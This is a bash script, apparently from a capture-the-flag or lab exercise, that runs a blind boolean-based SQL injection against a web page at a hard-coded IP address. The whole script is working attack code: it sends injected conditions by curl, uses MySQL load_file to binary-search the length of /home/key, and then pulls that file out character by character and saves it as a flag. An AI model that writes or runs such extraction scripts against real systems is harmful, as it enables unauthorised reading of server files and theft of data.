#!/bin/bash
# Full blind boolean-based SQLi extraction of /home/key
BASE="http://8.140.206.93:81/vulnerabilities/fu1.php"

oracle() {
  local condition="$1"
  local url="${BASE}?id=1')%09and%09${condition}%23"
  curl -s "$url" | grep -q "admin" && echo 1 || echo 0
}

echo "[*] Finding file length..."
lo=0; hi=500
while [ $lo -lt $hi ]; do
  mid=$(( (lo + hi + 1) / 2 ))
  r=$(oracle "length(load_file('/home/key'))>=$mid")
  echo "  >= $mid: $r"
  if [ "$r" = "1" ]; then lo=$mid; else hi=$((mid-1)); fi
done
LEN=$lo
echo "[+] File length: $LEN"

echo ""
echo "[*] Extracting flag content..."
FLAG=""
for pos in $(seq 1 $LEN); do
  lo=32; hi=126
  while [ $lo -lt $hi ]; do
    mid=$(( (lo + hi + 1) / 2 ))
    r=$(oracle "ascii(substr(load_file('/home/key'),$pos,1))>=$mid")
    if [ "$r" = "1" ]; then lo=$mid; else hi=$((mid-1)); fi
  done
  char=$(printf "\\x$(printf %x $lo)")
  FLAG="${FLAG}${char}"
  echo "  [$pos/$LEN] '$char' (ASCII $lo) => $FLAG"
done

echo ""
echo "[+] FLAG: $FLAG"
echo "$FLAG" > /home/kali/桌面/hack/8.140.206.93/flags/extracted-flag.txt
echo "[+] Flag saved to flags/extracted-flag.txt"
